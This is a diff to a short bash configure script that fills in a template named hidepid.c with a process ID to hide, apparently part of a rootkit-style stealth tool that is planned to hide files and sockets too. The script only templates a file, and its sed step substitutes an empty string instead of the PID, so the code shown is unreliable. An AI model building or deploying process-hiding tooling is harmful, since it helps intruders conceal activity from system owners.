@@ -1,22 +1,23 @@
 #!/bin/bash
 #author: mp
 #comment: psuedo configure script to set up hidepid.c with desired pid
-#         eventually more options will be used to files and sockets
+#eventually more options will be used to files and sockets
+
 PID=$1
 hidepid=0
 
 usage () {
-    echo "    /bin/bash <PID> - where pid is the pid you want to hide"
+    echo "    ./configure <PID> - where pid is the pid you want to hide"
     exit 1
 }
 
-if [ -z  ] ; then 
+if [ -z $PID ] ; then 
     echo -en "\x21\x21\x21 No pid to hide\n" && usage
 fi
 
-cat hideme.c | sed "s/___HIDEPID___//g" > _ && mv _ hidepid.c && hidepid=1
+cat templates/hidepid.c | sed "s/___HIDEPID___//g" > hidepid.c && hidepid=1
 
-if [[  -eq 1 ]] ; then
+if [[ $hidepid -eq 1 ]] ; then
     echo -en "\x2B\x2B\x2B Successfully configured hidepid.c\n"
 else
     echo -en "\x21\x21\x21 Failed to configure hidepid.c\n"
